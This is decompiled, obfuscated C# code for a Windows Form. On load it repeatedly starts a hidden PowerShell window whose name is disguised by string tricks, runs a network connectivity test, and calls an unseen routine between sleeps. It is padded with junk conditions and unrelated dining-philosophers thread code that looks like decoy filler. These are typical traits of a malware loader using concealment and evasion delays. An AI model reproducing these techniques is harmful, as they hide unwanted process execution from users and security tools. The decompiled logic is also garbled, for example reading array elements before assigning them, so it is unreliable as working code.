using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace Aoqokdrczyacbwbdmvoylntk;

public sealed class c : Form
{
	private IContainer m_a;

	private TreeView m_b;

	private TreeView m_c;

	private TreeView d;

	private TreeView e;

	private TreeView f;

	private TreeView g;

	private TreeView h;

	private TreeView i;

	public c()
	{
		if (5u != 0)
		{
			c();
		}
	}

	private void a(object a, EventArgs b)
	{
		try
		{
			int num;
			if (2u != 0)
			{
				num = 0;
			}
			while (num < 25)
			{
				if (7u != 0)
				{
					this.a();
				}
				if (0 == 0)
				{
					this.b();
				}
				int num2 = num + 1;
				if (0 == 0)
				{
					num = num2;
				}
			}
			b obj = new b(new bool[5], 5);
			obj.a();
			bool[] array = new bool[5];
			bool[] array2;
			if (4u != 0)
			{
				array2 = array;
			}
			obj.c();
			b[] array3 = new b[5];
			for (int num3 = 0; num3 < array3.Length; num3++)
			{
				b b2 = new b(array2, num3);
				Thread.Sleep(1000);
				Console.WriteLine(array3[num3].b());
				array3[num3] = b2;
				Thread thread = new Thread(b2.d);
				thread.Name = num3.ToString();
				thread.Start();
			}
			char[] array4 = new char[array3.Length];
			while (true)
			{
				for (int num4 = 0; num4 < array3.Length; num4++)
				{
					array4[num4] = array3[num4].a();
				}
				Console.WriteLine("{0} {1} {2} {3} {4}", array4[0], array4[1], array4[2], array4[3], array4[4]);
				if (Console.KeyAvailable)
				{
					Console.WriteLine("Antal måltider:");
					for (int num5 = 0; num5 < array3.Length; num5++)
					{
						Console.WriteLine("Filosof {0}: {1}", array3[num5].b(), array3[num5].a());
					}
				}
				Thread.Sleep(1000);
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			((Form)this).Close();
		}
	}

	private void a()
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "p%ow%er%sh%el%l".Replace("%", ""),
			Arguments = "Test-Connection www.google.com",
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		if (uint.MaxValue != 0)
		{
		}
	}

	private void b()
	{
		Aoqokdrczyacbwbdmvoylntk.f.a();
		if (4u != 0)
		{
			Thread.Sleep(1000);
		}
	}

	protected override void Dispose(bool a)
	{
		if (a && this.m_a != null)
		{
			this.m_a.Dispose();
		}
		if (3u != 0)
		{
			((Form)this).Dispose(a);
		}
	}

	private void c()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a8: Expected O, but got Unknown
		//IL_03b2: Expected O, but got Unknown
		//IL_03bc: Expected O, but got Unknown
		//IL_03c6: Expected O, but got Unknown
		//IL_03d0: Expected O, but got Unknown
		//IL_03da: Expected O, but got Unknown
		//IL_03e4: Expected O, but got Unknown
		//IL_03ee: Expected O, but got Unknown
		TreeView val = new TreeView();
		if (4u != 0)
		{
			this.m_b = val;
		}
		TreeView val2 = new TreeView();
		if (0 == 0)
		{
			this.m_c = val2;
		}
		TreeView val3 = new TreeView();
		if (uint.MaxValue != 0)
		{
			d = val3;
		}
		TreeView val4 = new TreeView();
		if (uint.MaxValue != 0)
		{
			e = val4;
		}
		TreeView val5 = new TreeView();
		if (7u != 0)
		{
			f = val5;
		}
		TreeView val6 = new TreeView();
		if (4u != 0)
		{
			g = val6;
		}
		TreeView val7 = new TreeView();
		if (7u != 0)
		{
			h = val7;
		}
		TreeView val8 = new TreeView();
		if (6u != 0)
		{
			i = val8;
		}
		((Control)this).SuspendLayout();
		((Control)this.m_b).set_Location(new Point(0, 0));
		((Control)this.m_b).set_Name("treeView1");
		((Control)this.m_b).set_Size(new Size(121, 97));
		((Control)this.m_b).set_TabIndex(0);
		((Control)this.m_c).set_Location(new Point(312, 12));
		((Control)this.m_c).set_Name("treeView2");
		((Control)this.m_c).set_Size(new Size(121, 97));
		((Control)this.m_c).set_TabIndex(1);
		((Control)d).set_Location(new Point(-11, 136));
		((Control)d).set_Name("treeView3");
		((Control)d).set_Size(new Size(121, 97));
		((Control)d).set_TabIndex(2);
		((Control)e).set_Location(new Point(159, 205));
		((Control)e).set_Name("treeView4");
		((Control)e).set_Size(new Size(121, 97));
		((Control)e).set_TabIndex(3);
		((Control)f).set_Location(new Point(251, 342));
		((Control)f).set_Name("treeView5");
		((Control)f).set_Size(new Size(121, 97));
		((Control)f).set_TabIndex(4);
		((Control)g).set_Location(new Point(159, 32));
		((Control)g).set_Name("treeView6");
		((Control)g).set_Size(new Size(121, 97));
		((Control)g).set_TabIndex(5);
		((Control)h).set_Location(new Point(56, 276));
		((Control)h).set_Name("treeView7");
		((Control)h).set_Size(new Size(121, 97));
		((Control)h).set_TabIndex(6);
		((Control)i).set_Location(new Point(286, 136));
		((Control)i).set_Name("treeView8");
		((Control)i).set_Size(new Size(121, 97));
		((Control)i).set_TabIndex(7);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(445, 574));
		((Control)this).get_Controls().Add((Control)(object)i);
		((Control)this).get_Controls().Add((Control)(object)h);
		((Control)this).get_Controls().Add((Control)(object)g);
		((Control)this).get_Controls().Add((Control)(object)f);
		((Control)this).get_Controls().Add((Control)(object)e);
		((Control)this).get_Controls().Add((Control)(object)d);
		((Control)this).get_Controls().Add((Control)(object)this.m_c);
		((Control)this).get_Controls().Add((Control)(object)this.m_b);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)a);
		((Control)this).ResumeLayout(false);
	}
}
